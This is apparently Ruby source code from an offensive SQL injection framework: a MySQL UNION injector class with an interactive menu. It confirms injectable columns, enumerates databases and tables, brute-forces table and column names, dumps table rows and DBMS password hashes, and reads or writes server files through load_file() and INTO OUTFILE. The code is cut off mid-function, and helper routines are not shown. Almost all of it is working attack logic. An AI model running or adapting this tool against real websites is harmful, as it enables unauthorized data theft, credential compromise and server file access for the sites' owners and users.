# This is our MySQL Union Injection Class
# If you add, just update the usage and union_shell function to make available

class MySQLUnionInjector
  def initialize
    puts
    @http=EasyCurb.new
    @tweak = TamperSQL.new
    @tweak.config
    @target_config = { 'UNION' => false,
      'VERSION' => nil, 'USER' => nil, 'HOST' => nil, 
      'TMPDIR' => nil, 'DATADIR' => nil, 'BASEDIR' => nil, 
      'CURRENT_DB' => nil, 'CDB_TABLES' => [], 
      'DBS' => [], 'DB_TABLES' => {}, 
      'PRIVILEGED' => false, 'PASSWORDS' => [] }
  end

  # MySQL Union Injector Help Menu
  def mysql_union_usage
    puts "List of available commands and general description".light_yellow + ": ".white
    puts "back ".light_yellow + "       => ".white + "Return to Main Menu".light_red
    puts "basic".light_yellow + "       => ".white + "Get Basic Info (User, Version, etc)".light_red
    puts "dbs".light_yellow + "         => ".white + "Get Available Database Names".light_red
    puts "tables".light_yellow + "      => ".white + "Get Tables in Current DB".light_red
    puts "dbtables".light_yellow + "    => ".white + "Get Tables in Another DB".light_red
    puts "tcolumns".light_yellow + "    => ".white + "Find Columns for Table in Current DB".light_red
    puts "dbcolumns".light_yellow + "   => ".white + "Find Columns for Table in Another DB".light_red
    puts "tdump".light_yellow + "       => ".white + "Dump Table from current DB".light_red
    puts "dbdump".light_yellow + "      => ".white + "Dump Table from another DB".light_red
    puts "passwords".light_yellow + "   => ".white + "Dump DBMS Usernames & Passwords (privileged)".light_red
    # TBD => Add Search Option (By DB Name, Table Name, Column Name, Custom)
    # User can decide if it is run using LIKE statement, REGEXP or an EQUAL comparison
    # i.e. where column='password'; where username like %admin% or %super% or %moderator%;
    puts "fuzz_tables".light_yellow + " => ".white + "Fuzz Tables in DB".light_red
    puts "fuzz_cols".light_yellow + "   => ".white + "Fuzz Columns in Table".light_red
    puts "read".light_yellow + "        => ".white + "Read Files via load_file() (privileged)".light_red
    puts "write".light_yellow + "       => ".white + "Write Files via INTO OUTFILE (privileged)".light_red
    puts "save ".light_yellow + "       => ".white + "Save Basic Injection Info to Results directory".light_red
    print_line("")
  end

  # MySQL Union Injector Menu
  def mysql_union_menu
    puts
    prompt = "(MySQL_Union)> "
    while line = Readline.readline("#{prompt}", true)
      cmd = line.chomp
      case cmd
      when /^c$|^clear$|^cls$/i
        cls
        banner
        mysql_union_menu
      when /^h$|^help$|^ls$/i
        puts
        mysql_union_usage
        mysql_union_menu
      when /^exit$|^quit$|^back$/i
        puts
        saveme
        print_error("Returning to Main Menu....")
        main_menu
      when /^!(.+)/
        cmd=$1.strip.chomp
        res = commandz(cmd)
        print_line("\n#{res.join().chomp}")
        mysql_union_menu
      when /^local$|^OS$/i
        local_shell
        mysql_union_menu
      when /^ip2host$|^host2ip$/i
        host = Readline.readline("   Target IP or Domain: ", true)
        dnsenum = DNSEnum.new(host.strip.chomp)
        ip, domain, hostname = dnsenum.host_info
        puts
        print_status("IP: #{ip}")
        print_status("Domain: #{domain}") unless domain == ip
        print_status("Hostname: #{hostname}\n\n")
        mysql_union_menu
      when /^check|^confirm|^union|^start/i
        print_line("")
        union_check
        mysql_union_menu
      when /^basic|^show basic|^get basic$/i
        print_line("")
        get_basic
        mysql_union_menu
      when /^dbs$|^databases$|^show databases$/i
        print_line("")
        get_dbs
        mysql_union_menu
      when /^tables|^show tables|^current tables|^show current tables/i
        print_line("")
        get_tables
        mysql_union_menu
      when /^dbtables|^show dbtables|^tables.db|^database.tables|^tables.database/i
        print_line("")
        line = Readline.readline("(Database Name)> ", true)
        db_name = line.strip.chomp
        print_line("")
        get_tables_db(db_name)
        mysql_union_menu
      when /^tcolumns|^table.column|^column.+table|^tblcol|^tcol/i
        print_line("")
        line = Readline.readline("(Table Name)> ", true)
        table_name=line.strip.chomp
        print_line("")
        get_columns_table('database()', table_name)
        mysql_union_menu
      when /^dbcol|^db.col|^database.col|^dbscol/i
        print_line("")
        line = Readline.readline("(Database Name)> ", true)
        db_name=line.strip.chomp
        line = Readline.readline("(Table Name)> ", true)
        table_name=line.strip.chomp
        print_line("")
        get_columns_table(db_name, table_name)
        mysql_union_menu
      when /^tdump|^tbldump|^table.dump/i
        print_line("")
        print_status("Database Dump Setup...")
        db_name = 'database()' if @target_config['CURRENT_DB'].nil?
        db_name = @target_config['CURRENT_DB'] unless @target_config['CURRENT_DB'].nil?
        line = Readline.readline("(Table Name)> ", true)
        table_name = line.strip.chomp
        line = Readline.readline("(Comma Separated List of Columns to Dump)> ", true)
        columns = line.strip.chomp.split(",")
        print_line("")
        query = "select count(#{columns[0]}) from #{table_name}"
        results = union_basic_inject($config['INJECTOR']['MYSQL']['UNION']['VULN_COLUMN'].to_i, query)
        if results.nil?
          start = 0
          print_error("Unable to determine number of entries in #{table_name}....")
          line = Readline.readline("(Number of Rows to try and dump)> ", true)
          stop = line.strip.chomp.to_i
        else
          print_good("#{table_name} contains #{results} entries...")
          print_caution("Do you want to dump all (Y/N)?")
          answer = gets.strip.chomp
          print_line("")
          if answer.upcase == 'Y' or answer.upcase == 'YES'
            start = 0
            stop = results.to_i
            print_status("OK, attempting to dump #{stop - start} entries...")
          else
            line = Readline.readline("(Starting Row Number)> ", true)
            start = line.strip.chomp.to_i
            line = Readline.readline("(Row Number to Stop on)> ", true)
            stop = line.strip.chomp.to_i
            print_line("")
            print_status("OK, attempting to dump #{stop - start} entries...")
          end
        end
        union_data_dump(db_name, table_name, columns, start.to_i, stop.to_i)
        mysql_union_menu
      when /^dbdump|^dbtdump|^dbtbldump|^db.table.dump/i
        print_line("")
        print_status("Database Dump Setup...")
        line = Readline.readline("(Database Name)> ", true)
        db_name = line.strip.chomp
        line = Readline.readline("(Table Name)> ", true)
        table_name = line.strip.chomp
        line = Readline.readline("(Comma Separated List of Columns to Dump)> ", true)
        columns = line.strip.chomp.split(",")
        print_line("")
        query = "select count(#{columns[0]}) from #{db_name}.#{table_name}"
        results = union_basic_inject($config['INJECTOR']['MYSQL']['UNION']['VULN_COLUMN'].to_i, query)
        if results.nil?
          start = 0
          print_error("Unable to determine number of entries in #{db_name}.#{table_name}....")
          line = Readline.readline("(Number of Rows to try and dump)> ", true)
          stop = line.strip.chomp.to_i
        else
          print_good("#{db_name}.#{table_name} contains #{results} entries...")
          print_caution("Do you want to dump all (Y/N)?")
          answer=gets.strip.chomp
          print_line("")
          if answer.upcase == 'Y' or answer.upcase == 'YES'
            start = 0
            stop = results.to_i
            print_status("OK, attempting to dump #{stop - start} entries...")
          else
            line = Readline.readline("(Starting Row Number)> ", true)
            start = line.strip.chomp.to_i
            line = Readline.readline("(Row Number to Stop on)> ", true)
            stop = line.strip.chomp.to_i
            print_line("")
            print_status("OK, attempting to dump #{stop - start} entries...")
          end
        end
        union_data_dump(db_name, table_name, columns, start.to_i, stop.to_i)
        mysql_union_menu
      when /^password|^pass.dump|^dump.pass/i
        print_line("")
        union_password_dump
        mysql_union_menu
      when /^fuzz.table|^table.fuzz|^tbl.fuzz/i
        print_line("")
        while(true)
          print_caution("Select Table Fuzzing Option: ")
          print_caution("1) Fuzz Tables from Current DB")
          print_caution("2) Fuzz Tables from Another DB")
          answer=gets.chomp
          print_line("")
          if answer.to_i == 1
            db_name='CURRENT-DB'
            break
          elsif answer.to_i == 2
            line = Readline.readline("(Database Name)> ", true)
            db_name = line.chomp
            print_line("")
            break
          else
            print_line("")
            print_error("Oops, Didn't quite understand that one")
            print_error("Please Choose a Valid Option From Menu Below Next Time.....")
            print_line("")
          end
        end
        print_caution("Use custom fuzz file (Y/N)?")
        answer=gets.chomp
        print_line("")
        if answer.upcase == 'Y' or answer.upcase == 'YES'
          line = Readline.readline("(Path to Custom Fuzz File)> ", true)
          answer=line.strip.chomp
          print_line("")
          if File.exists?(answer)
            fuzz_file = answer
          else
            print_error("Problem loading custom file, using default list instead.....")
            fuzz_file = "#{HOME}fuzz/common_tables.lst"
          end
        else
          fuzz_file = "#{HOME}fuzz/common_tables.lst"
        end
        tables = common_tables(db_name, fuzz_file)
        print_line("")
        if tables.empty?
          print_line("")
          print_error("Doesn't appear any tables were found!")
          print_error("Try updating your common_tables.lst file to include additional possibilitiess or check things manually, sorry.....")
          print_line("")
        else
          print_good("DB: #{db_name}") if @target_config['CURRENT_DB'].nil?
          print_good("DB: #{@target_config['CURRENT_DB']}") unless @target_config['CURRENT_DB'].nil?
          print_good("TABLES: #{@target_config['DB_TABLES']["#{db_name}"].join(", ").sub(/, $/, '')}")
        end
        mysql_union_menu
      when /^fuzz.column|^column.fuzz|^col.fuzz/i
        print_line("")
        while(true)
          print_caution("Select Column Fuzzing Option: ")
          print_caution("1) Fuzz Columns from Table in Current DB")
          print_caution("2) Fuzz Columns from Table in Another DB")
          answer=gets.chomp
          print_line("")
          if answer.to_i == 1
            db_name='CURRENT-DB'
            break
          elsif answer.to_i == 2
            line = Readline.readline("(Database Name)> ", true)
            db_name = line.chomp
            break
          else
            print_line("")
            print_error("Oops, Didn't quite understand that one")
            print_error("Please Choose a Valid Option From Menu Below Next Time.....")
            print_line("")
          end
        end
        while(true)
          line = Readline.readline("(Table Name)> ", true)
          answer=line.strip.chomp
          print_line("")
          if not answer == ''
            table_name=answer
            break
          else
            print_error("Provie table name so we know where to fuzz columns!")
            print_line("")
          end
        end
        print_caution("Use custom fuzz file (Y/N)?")
        answer=gets.chomp
        print_line("")
        if answer.upcase == 'Y' or answer.upcase == 'YES'
          line = Readline.readline("(Path to Column Fuzz File)> ", true)
          answer=line.strip.chomp
          print_line("")
          if File.exists?(answer)
            fuzz_file = answer
          else
            print_error("Problem loading custom file, using default list instead.....")
            fuzz_file = "#{HOME}fuzz/common_columns.lst"
          end
        else
          fuzz_file="#{HOME}fuzz/common_columns.lst"
        end
        cols = common_columns(db_name, table_name, fuzz_file)
        print_line("")
        if cols.empty?
          print_line("")
          print_error("Doesn't appear any columns were found!")
          print_error("Try updating your #{fuzz_file} file to include additional possibilitiess or check things manually, sorry.....")
          print_line("")
        else
          print_good("DB: #{db_name}") if @target_config['CURRENT_DB'].nil?
          print_good("DB: #{@target_config['CURRENT_DB']}") unless @target_config['CURRENT_DB'].nil?
          print_good("TABLES: #{table_name}")
          print_good("COLUMNS: #{cols.join(", ").sub(/, $/, '')}")
        end
        mysql_union_menu
      when /^read|^file read|^load.file/i
        print_line("")
        while(true)
          print_caution("Select File Reader Option: ")
          print_caution("1) Single File")
          print_caution("2) File Reader Shell")
          print_caution("3) Fuzz Readable Files")
          answer=gets.chomp
          if answer.to_i > 0 and answer.to_i <= 3
            case answer.to_i
            when 1
              line = Readline.readline("(File to Read)> ", true)
              file = line.strip.chomp
              read_file(file)
              break
            when 2
              print_status("Dropping to File Reader Pseudo Shell...")
              print_caution("Type the path and filename to read file off backend server...")
              print_caution("Type 'QUIT' or 'EXIT' to close!\n")
              read_file_shell
              break
            when 3
              print_status("Prepping for File Reader Fuzzer...")
              read_file_fuzz
              break
            end
          else
            print_line("")
            print_error("Oops, Didn't quite understand that one")
            print_error("Please Choose a Valid Option From Menu Below Next Time.....")
            print_line("")
          end
        end
        mysql_union_menu
      when /^write|^file write|^into.outfile/i
        print_line("")
        file_writer_setup
        mysql_union_menu
      when /^save|^log/i
        print_line("")
        saveme
        mysql_union_menu
      else
        puts
        print_error("Oops, Didn't quite understand that one!")
        print_error("Please try again...\n")
        mysql_union_menu
      end
    end
  end

  # Confirm Union Injection is possible
  # Simply use concat to reflect back some hex'd text we send
  # If the vulnerable column is not provided we will try to fuzz to find it...
  def union_check
    if $config['INJECTOR']['MYSQL']['UNION']['VULN_COLUMN'].to_i == 0
      # Vuln Column not provided, try fuzzing for it....
      print_caution("Vulnerbale Column is not known!")
      print_caution("Going to try and fuzz to find, hang tight a sec....")

      # Shift our marker value from one column to the next and retest
      # once found, set vuln column to count, or fail
      count=0
      found=0
      while count.to_i <= $config['INJECTOR']['MYSQL']['UNION']['COLUMN_COUNT'].to_i
        count = count.to_i + 1
        $config['INJECTOR']['MYSQL']['UNION']['VULN_COLUMN'] = count.to_i
        res = union_basic_inject(count, randz(8).mysqlhex)
        if not res.nil? and res != ''
          print_good("Site is injectable through Column\# #{count}")
          found=1
          break
        end
        $config['INJECTOR']['MYSQL']['UNION']['VULN_COLUMN'] = 0 # If we dont find it
      end
      if found == 0
        puts
        print_error("Unable to find vulnerable column!")
        print_error("Try to find manually and reconfigure to get working.....\n")
        @target_config['UNION'] = false
        return false
      else
        @target_config['UNION'] = true
        return true
      end
    else
      # Vuln Column Number Provided - NO Guessing!
      print_status("Confirming Union Injection using Column #{$config['INJECTOR']['MYSQL']['UNION']['VULN_COLUMN']}")
      results = union_basic_inject($config['INJECTOR']['MYSQL']['UNION']['VULN_COLUMN'].to_i, randz(8).mysqlhex)
      if results.nil? or results == ''
        puts
        print_error("No Signs of Injection using Column\# #{$config['INJECTOR']['MYSQL']['UNION']['VULN_COLUMN']}!")
        print_error("Reconfigure without setting vulnerable column value or adjust Tamper settings and then try again....\n")
        @target_config['UNION'] = false
        return false
      else
        print_good("Site is injectable through Column #{$config['INJECTOR']['MYSQL']['UNION']['VULN_COLUMN']}!\n")
        @target_config['UNION'] = true
        return true
      end
    end
  end

  # Fetch some basic info from target
  def get_basic
    if not @target_config['UNION']
      puts
      print_error("Union Injection NOT Confirmed Yet!")
      print_error("Run the 'CHECK' command to confirm and then try again....\n\n")
    else
      srvn = '@@hostname'
      ver  = [ 'version()', '@@version', '@@GLOBAL.VERSION' ]
      cdb  = [ 'database()', '@@database', 'schema()', 'current_database()' ]
      usr  = [ 'user()', 'system_user()', 'current_user()', 'session_user()' ]
      dirz = [ '@@datadir', '@@basedir', '@@tmpdir' ]

      print_status("############### BASIC INFO ##################")
      # Find Hostname of DB Server
      if @target_config['HOST'].nil?
        results = union_basic_inject($config['INJECTOR']['MYSQL']['UNION']['VULN_COLUMN'].to_i, srvn)
        if results.nil? or results == ''
          print_error("Unable to determine Hostname!")
        else
          @target_config['HOST'] = results
          print_good("Hostname: #{@target_config['HOST']}")
        end
      else
        print_good("Hostname: #{@target_config['HOST']}")
      end

      # Find Version of DB we are injecting
      if @target_config['VERSION'].nil?
        while(true)
          ver.each do |version|
            results = union_basic_inject($config['INJECTOR']['MYSQL']['UNION']['VULN_COLUMN'].to_i, version)
            if not results.nil? and results != ''
              @target_config['VERSION'] = results
              print_good("Windows Backend OS Detected!") if @target_config['VERSION'] =~ /-nt-log/
              print_good("Version:  #{@target_config['VERSION']}")
              break
            end
          end
          break
        end
        print_error("Unable to determine Version!") if @target_config['VERSION'].nil?
      else
        print_good("Version:  #{@target_config['VERSION']}")
      end

      # Find Current Username
      if @target_config['USER'].nil?
        while(true)
          usr.each do |user|
            results = union_basic_inject($config['INJECTOR']['MYSQL']['UNION']['VULN_COLUMN'].to_i, user)
            if not results.nil? and results != ''
              @target_config['USER'] = results
              print_good("Username:  #{@target_config['USER']}")
              break
            end
          end
          break
        end
        print_error("Unable to determine current Username!") if @target_config['USER'].nil?
      else
        print_good("Username:  #{@target_config['USER']}")
      end

      # Find Current Database Name
      if @target_config['CURRENT_DB'].nil?
        while(true)
          cdb.each do |current_db|
            results = union_basic_inject($config['INJECTOR']['MYSQL']['UNION']['VULN_COLUMN'].to_i, current_db)
            if not results.nil? and results != ''
              @target_config['CURRENT_DB'] = results
              print_good("Database:  #{@target_config['CURRENT_DB']}")
              break
            end
          end
          break
        end
        print_error("Unable to determine current database name!") if @target_config['CURRENT_DB'].nil?
      else
        print_good("Database:  #{@target_config['CURRENT_DB']}")
      end

      # Find Directory Information (Datadir, basedir, tmpdir)
      while(true)
        dirz.each do |dirpath|
          case dirpath
          when '@@basedir'
            if @target_config['BASEDIR'].nil?
              results = union_basic_inject($config['INJECTOR']['MYSQL']['UNION']['VULN_COLUMN'].to_i, dirpath)
              if results.nil?
                print_error("Unable to determine basedir!")
              else
                @target_config['BASEDIR'] = results
                print_good("Basedir:  #{@target_config['BASEDIR']}")
              end
            else
              print_good("Basedir:  #{@target_config['BASEDIR']}")
            end
          when '@@datadir'
            if @target_config['DATADIR'].nil?
              results = union_basic_inject($config['INJECTOR']['MYSQL']['UNION']['VULN_COLUMN'].to_i, dirpath)
              if results.nil?
                print_error("Unable to determine datadir!")
              else
                @target_config['DATADIR'] = results
                print_good("Datadir:  #{@target_config['DATADIR']}")
              end
            else
              print_good("Datadir:  #{@target_config['DATADIR']}")
            end
          when '@@tmpdir'
            if @target_config['TMPDIR'].nil?
              results = union_basic_inject($config['INJECTOR']['MYSQL']['UNION']['VULN_COLUMN'].to_i, dirpath)
              if results.nil?
                print_error("Unable to determine tmpdir!")
              else
                @target_config['TMPDIR'] = results
                print_good("Tmpdir:  #{@target_config['TMPDIR']}")
              end
            else
              print_good("Tmpdir:  #{@target_config['TMPDIR']}")
            end
          end
        end
        break
      end
      print_status("#############################################")
    end
  end

  # Try to enumerate the available databases
  # Returns array of available db
  def get_dbs
    if @target_config['VERSION'].scan(/./)[0].to_i < 5 and not @target_config['VERSION'].nil?
      # MySQL < 5
      print_error("DB Version: #{@target_config['VERSION']}")
      print_error("There is no information_schema to query.....")
      print_error("Unable to enumerate databases for MySQL < 5")
    elsif @target_config['VERSION'].scan(/./)[0].to_i >= 5 or @target_config['VERSION'].nil?
      # MySQL v5+
      results = union_basic_inject($config['INJECTOR']['MYSQL']['UNION']['VULN_COLUMN'].to_i, 'select count(schema_name) from information_schema.schemata')
      if results.nil?
        results = union_basic_inject($config['INJECTOR']['MYSQL']['UNION']['VULN_COLUMN'].to_i, 'select count(distinct(db)) from mysql.db') #This usually needs privs, but maybe in some case if info schema is blocked
        dbs_count=0 unless not results.nil?
        print_error("Unable to get database count, flying a bit blind!") unless not results.nil?
        dbs_count=results unless results.nil?
        print_status("Requesting #{dbs_count} Databases Names....") unless results.nil?
      else
        dbs_count=results
        print_status("Requesting #{dbs_count} Databases Names....")
      end
      dbz=[]
      count=0
      while not results.nil?
        results = union_basic_inject($config['INJECTOR']['MYSQL']['UNION']['VULN_COLUMN'].to_i, "select schema_name from information_schema.schemata limit #{count},1")
        pad = ' ' * (results.size + 10) unless results == '' or results.nil?
        pad = ' ' * 50 if results.nil?
        print "\r(#{count})> #{results}#{pad}".cyan unless results == ''
        dbz << results unless results == ''
        count = count.to_i + 1
      end
      print_line("")
      if dbz.empty?
        print_line("")
        print_error("Unable to get any database names!")
        print_error("Lack of privileges?")
        print_status("Possible Solutions include:")
        print_caution("A) Become HR's best friend by updating the code and sending him a copy")
        print_caution("B) Tweak Settings and try things again")
        print_caution("C) Be a bawz and do it manually")
        print_line("")
      else	
        @target_config['DBS'] += dbz
        @target_config['DBS'].uniq! unless @target_config['DBS'].nil? or @target_config['DBS'].size == 0
        print_good("DBS: #{dbz.join(', ').sub(/, $/, '')}") unless dbz.nil? or dbz.size == 0
        print_good("DBS: #{@target_config['DBS'].join(', ').sub(/, $/, '')}") if dbz.nil? or dbz.size == 0 and not @target_config['DBS'].nil?
      end
    end
  end

  # Get the Tables from the Current Database
  # Returns string of tablenames separated by space (for easy splitting later if need be)
  # Returns nil when nothing is found or problems are encounteredl
  def get_tables
    if @target_config['CDB_TABLES'].empty?
      if not @target_config['VERSION'].nil?
        if @target_config['VERSION'].scan(/./)[0].to_i < 5
          # MySQL < 5
          print_error("MySQL < 5: #{@target_config['VERSION']}")
          print_error("There is no information_schema to query for tables as result.....")
          if not @target_config['CURRENT_DB'].nil?
            print_error("Do you want to try Common Table Names (Y/N)?")
            answer=gets.chomp
            print_line("")
            if answer.upcase == 'Y' or answer.upcase == 'YES'
              tables = common_tables('CURRENT-DB', "#{HOME}fuzz/common_tables.lst")
              if tables.empty?
                print_error("OK, returning to menu...")
                return nil
              else
                print_good("DB: #{@target_config['CURRENT_DB']}")
                print_good("Tables: #{tables.join(', ').sub(/, $/, '')}")
                @target_config['CDB_TABLES'] = tables
                @target_config['DB_TABLES']["#{@target_config['CURRENT_DB']}"] = @target_config['CDB_TABLES'] unless @target_config['CURRENT_DB'].nil?
                @target_config['DB_TABLES']['Current DB'] = @target_config['CDB_TABLES'] if @target_config['CURRENT_DB'].nil?
                return tables.join(' ')
              end
            else
              print_error("OK, returning to menu...")
              return nil
            end
          else
            print_error("OK, returning to menu...")
            return nil
          end
        else
          # MySQL >= 5
          if @target_config['CURRENT_DB'].nil?
            print_error("Current DB has not yet been discovered!")
            print_error("Try BASIC command if you haven't already!")
            print_error("You can also use DBTABLES command if you know the DB Name....")
            print_error("FUZZ_TABLES can be used as a last resort as well if you know the DB Name...")
            return nil
          else
            count=0
            tables=[]
            query = 'select count(table_name) from information_schema.tables where table_schema=database()'
            results = union_basic_inject($config['INJECTOR']['MYSQL']['UNION']['VULN_COLUMN'].to_i, query)
            if results.nil?
              query = 'select count(table_name) from information_schema.tables where table_schema=schema()'
              results = union_basic_inject($config['INJECTOR']['MYSQL']['UNION']['VULN_COLUMN'].to_i, query)
              if results.nil?
                query = "select count(table_name) from information_schema.tables where table_schema=#{@target_config['CURRENT_DB'].mysqlhex}"
                results = union_basic_inject($config['INJECTOR']['MYSQL']['UNION']['VULN_COLUMN'].to_i, query)
                if results.nil?
                  print_error("Unable to determine number of tables in current database, sorry....")
                end
              end
            end
            if not results.nil?
              print_good("Fetching #{results} Tables from Current DB")
              case query
              when /database()/
                dbn='database()'
              when /schema()/
                dbn='schema()'
              when /0x[a-z0-9]{1,}/
                dbn="#{@target_config['CURRENT_DB'].mysqlhex}"
              end
              while not results.nil?
                results = union_basic_inject($config['INJECTOR']['MYSQL']['UNION']['VULN_COLUMN'].to_i, "select table_name from information_schema.tables where table_schema=#{dbn} limit #{count},1")
                pad = ' ' * (results.size + 25) unless results == '' or results.nil?
                pad = ' ' * 50 if results.nil?
                print "\r(#{count})> #{results}#{pad}".cyan unless results == ''
                tables << results unless results == ''
                count = count.to_i + 1
              end
              print_line("")
              if tables.empty?
                print_line("")
                print_error("Unable to get any tables from the current database!")
                print_error("Lack of privileges? IDK....")
                print_status("Possible Solutions include:")
                print_caution("A) Become HR's best friend by updating the code and sending him a copy")
                print_caution("B) Tweak Settings and try things again")
                print_caution("C) Be a bawz and do it manually")
                print_line("")
                return nil
              else	
                @target_config['CDB_TABLES'] = tables
                @target_config['DB_TABLES']["#{@target_config['CURRENT_DB']}"] = @target_config['CDB_TABLES'] unless @target_config['CURRENT_DB'].nil?
                @target_config['DB_TABLES']['Current DB'] = @target_config['CDB_TABLES'] if @target_config['CURRENT_DB'].nil?
                print_good("Current DB: #{@target_config['CURRENT_DB']}")
                print_good("Tables: #{tables.join(', ').sub(/, $/, '')}")
                return tables.join(' ')
              end
            else
              print_error("Do you want to try Common Table Names (Y/N)?")
              answer=gets.chomp
              print_line("")
              if answer.upcase == 'Y' or answer.upcase == 'YES'
                tables = common_tables('CURRENT-DB', "#{HOME}fuzz/common_tables.lst")
                if tables.empty?
                  print_error("OK, returning to menu...")
                  return nil
                else
                  print_good("DB: #{@target_config['CURRENT_DB']}")
                  print_good("Tables: #{tables.join(', ').sub(/, $/, '')}")
                  @target_config['CDB_TABLES'] = tables
                  @target_config['DB_TABLES']["#{@target_config['CURRENT_DB']}"] = @target_config['CDB_TABLES']
                  return tables.join(' ')
                end
              else
                print_error("OK, returning to menu...")
                return nil
              end
            end
          end
        end
      else
        print_error("No version info collected yet!")
        print_error("Try using the BASIC comamnd and then try again....")
        print_error("You could also use the FUZZ TABLES option....")
      end
    else
      print_good("DB: #{@target_config['CURRENT_DB']}") unless @target_config['CURRENT_DB'].nil?
      print_good("Tables: #{@target_config['CDB_TABLES'].join(', ').sub(/, $/, '')}")
      @target_config['DB_TABLES']["#{@target_config['CURRENT_DB']}"] = @target_config['CDB_TABLES'] unless @target_config['CURRENT_DB'].nil?
      @target_config['DB_TABLES']['Current DB'] = @target_config['CDB_TABLES'] if @target_config['CURRENT_DB'].nil?
    end
  end

  # Get the Tables from the Database
  # Returns string of tablenames separated by space (for easy splitting later if need be)
  # Stores results into the db_tables Hash for tracking
  # Returns nil when nothing is found or problems are encounteredl
  def get_tables_db(db_name)
    if @target_config['VERSION'].scan(/./)[0].to_i >= 5
      # MySQL >= 5
      if not @target_config['DB_TABLES'].keys.include?(db_name)
        query = "select count(table_name) from information_schema.tables where table_schema=#{db_name.mysqlhex}"
        results = union_basic_inject($config['INJECTOR']['MYSQL']['UNION']['VULN_COLUMN'].to_i, query)
        if results.nil?
          print_error("Unable to determine number of tables in current database....")
        else
          print_good("Fetching #{results} Tables from Current DB")
        end
        count=0
        tables=[]
        while not results.nil?
          results = union_basic_inject($config['INJECTOR']['MYSQL']['UNION']['VULN_COLUMN'].to_i, "select table_name from information_schema.tables where table_schema=#{db_name.mysqlhex} limit #{count},1")
          pad = ' ' * (results.size + 25) unless results == '' or results.nil?
          pad = ' ' * 50 if results.nil?
          print "\r(#{count})> #{results}#{pad}".cyan unless results == ''
          tables << results unless results == ''
          count = count.to_i + 1
        end
        print_line("")
        if tables.empty?
          print_error("Unable to get any tables from the current database!")
          print_error("Lack of privileges? IDK....")
          print_status("Possible Solutions include:")
          print_caution("A) Become HR's best friend by updating the code and sending him a copy")
          print_caution("B) Tweak Settings and try things again")
          print_caution("C) Be a bawz and do it manually")
          print_line("")
          return nil
        else	
          @target_config['DB_TABLES']["#{db_name}"] = tables
          print_good("DB: #{db_name}")
          print_good("Tables: #{tables.join(', ').sub(/, $/, '')}")
          return tables.join(' ')
        end
      else
        db = db_name
        tables = @target_config['DB_TABLES']["#{db_name}"].join(', ').sub(/, $/, '')
        print_good("DB: #{db}")
        print_good("Tables: #{tables}")
      end
    else
      # MySQL < 5
      print_error("MySQL < 5: #{@target_config['VERSION']}")
      print_error("There is no information_schema to query for tables as result.....")
      if not @target_config['CURRENT_DB'].nil?
        print_error("Do you want to try Common Table Names (Y/N)?")
        answer=gets.chomp
        print_line("")
        if answer.upcase == 'Y' or answer.upcase == 'YES'
          tables = common_tables('CURRENT-DB', "#{HOME}fuzz/common_tables.lst")
          if tables.empty?
            print_error("OK, returning to menu...")
            return nil
          else
            print_good("DB: #{db_name}")
            print_good("Tables: #{tables.join(', ').sub(/, $/, '')}")
            @target_config['DB_TABLES']["#{db_name}"] = tables
            return tables.join(' ')
          end
        else
          print_error("OK, returning to menu...")
          return nil
        end
      else
        print_error("OK, returning to menu...")
        return nil
      end
    end
  end

  # Common Tables Check
  # Bruteforce/Dictionary Attack
  def common_tables(db_name, fuzz_file)
    if File.exists?(fuzz_file)
      tables=[]
      fuzz_tables = File.open(fuzz_file).readlines
      print_status("Loaded #{fuzz_tables.size} table names from #{fuzz_file} into queue....")
      print_status("Starting Table Fuzzing against '#{db_name}'....")
      count=1
      fuzz_tables.each do |fuzzy|
        # Try to see if table exists using IF statement and REGEXP.....
        # http://ha.xxor.se/2011/06/speeding-up-blind-sql-injections-using.html
        # Twerked slightly to work for UNION Injections to basicly bruteforce tables/dbs/etc
        ############################################################
        pad = '' * 20
        if db_name =~ /CURRENT-DB|database()|schema()/ #Brute against current active database
          regexp_table_check="SELECT 1 REGEXP IF((select count(*) from #{fuzzy.chomp})>0,0,'')"
        else
          regexp_table_check="SELECT 1 REGEXP IF((select count(*) from #{db_name}.#{fuzzy.chomp})>0,0,'')"
        end
        print "\r(".light_yellow + "#{count}".white + "/".light_yellow + "#{fuzz_tables.size}".white + ")>".light_yellow + " #{fuzzy.chomp}".cyan + pad
        results = union_basic_inject($config['INJECTOR']['MYSQL']['UNION']['VULN_COLUMN'].to_i, regexp_table_check)
        if results == '0'
          pd = ' ' * (100 + fuzzy.chomp.size)
          print "\r[".light_green + "*".white + "]".light_green + "the table '#{fuzzy.chomp}' appears to exist!".white + pd
          tables << fuzzy.chomp
        end
        count=count.to_i + 1
        ############################################################
      end
      @target_config['DB_TABLES']["#{db_name}"] = tables
      return tables
    else
      puts
      print_error("Unable to load fuzz file!")
      print_error("Check path or permissions and try again....\n\n")
      return nil
    end
  end

  # Common Columns Check
  # Bruteforce/Dictionary Attack
  def common_columns(db_name, table_name, fuzz_file)
    if File.exists?(fuzz_file)
      columns=[]
      fuzz_columns=File.open(fuzz_file).readlines
      print_status("Loaded #{fuzz_columns.size} column names from #{fuzz_file} into queue....")
      if db_name =~ /CURRENT-DB|database()|schema()/
        print_status("Starting Column Fuzzing against #{table_name}....")
      else
        print_status("Starting Column Fuzzing against #{db_name}.#{table_name}....")
      end
      count=1
      fuzz_columns.each do |fuzzy|
        pad = '' * 20
        if db_name =~ /CURRENT-DB|database()|schema()/ #Brute against current active database
          regexp_table_check="SELECT 1 REGEXP IF((select count(#{fuzzy.chomp}) from #{table_name})>0,0,'')"
        else
          regexp_table_check="SELECT 1 REGEXP IF((select count(#{fuzzy.chomp}) from #{db_name}.#{table_name.chomp})>0,0,'')"
        end
        print "\r(".light_yellow + "#{count}".white + "/".light_yellow + "#{fuzz_columns.size}".white + ")>".light_yellow + " #{fuzzy.chomp}".cyan + pad
        results = union_basic_inject($config['INJECTOR']['MYSQL']['UNION']['VULN_COLUMN'].to_i, regexp_table_check)
        if results == '0'
          pd = ' ' * (100 + fuzzy.chomp.size)
          print "\r[".light_green + "*".white + "]".light_green + "the column '#{fuzzy.chomp}' appears to exist!".white + pd
          columns << fuzzy.chomp
        end
        count=count.to_i + 1
      end
      # Not storing columns, maybe later when i figure out how to build directory tree based on results
      return columns
    else
      puts
      print_error("Unable to load fuzz file!")
      print_error("Check path or permissions and try again....\n\n")
      return nil
    end
  end

  # Get Columns from Known Table
  def get_columns_table(db_name, table_name)
    if @target_config['VERSION'].scan(/./)[0].to_i < 5 
      # MySQL < 5
      print_error("MySQL < 5: #{@target_config['VERSION']}")
      print_error("There is no information_schema to query for columns from known tables as result.....")
      print_error("Do you want to try Common Column Names (Y/N)?")
      answer=gets.chomp
      print_line("")
